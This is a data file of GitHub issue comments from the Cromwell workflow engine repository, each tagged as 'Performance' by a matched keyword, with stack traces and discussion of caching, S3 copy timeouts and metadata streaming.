java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""Service Thread"" #17 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d4000 nid=0x9f9 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. """,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5394,concurren,concurrent,5394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,re `6: hashes beside CRC32` - yes we *can* use anything. Only if we want to call cache between tasks from different FS's do we need to standardize. That's not been a problem for now between local (`md5`) and GCS (`CRC32C`) because we'd never call cache between local and PAPI anyway,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400829241:81,cache,cache,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400829241,2,['cache'],['cache']
Performance,"re containers, would the `cached-copy` localization strategy in #4900 help you?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507792585:26,cache,cached-copy,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507792585,1,['cache'],['cached-copy']
Performance,"re, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1821,tune,tune,1821,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['tune'],['tune']
Performance,"read.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:9418,concurren,concurrent,9418,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"read.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:8225,concurren,concurrent,8225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"reaming, blue is streaming. ---; The main takeaway is that when **under memory pressure** (i.e when available memory is insufficient to build the requested metadata), streaming makes a significant difference on relieving the heap usage for medium to large (> 100K) metadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the overall response time is increasing significantly.; If Cromwell has sufficient memory to sustain the load then streaming does not give any real improvement.; The graph below shows memory usage with (v1s) and without streaming (v1) when Cromwell has enough memory to build all requests (in MB).; ![memory-v1-v1s](https://user-images.githubusercontent.com/2978948/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used for another query as soon as all the data has been pulled and Cromwell is building the metadata. The extra time spent with the connection used in the streaming version can then delay subsequent requests when lots of metadata requests are being made.; We also see that the graph spans longer on the X axis for the streaming version, which means the test took longer to complete. [The test](https://github.com/broadinstitute/cromwell/blob/tj-metadata-stream-experiment-2/scripts/perf/test_cases/meta",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:2981,response time,response time,2981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['response time'],['response time']
Performance,restarts didn't seem to do the trick but a cache blast + restart is looking better,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5489#issuecomment-617366702:43,cache,cache,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5489#issuecomment-617366702,1,['cache'],['cache']
Performance,returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:110); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:548); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:538); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 500 Internal Server Error; Backend Error; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:2404,concurren,concurrent,2404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['concurren'],['concurrent']
Performance,"rkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:11,89] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:11,89] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:7:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pol",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:10543,concurren,concurrent,10543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
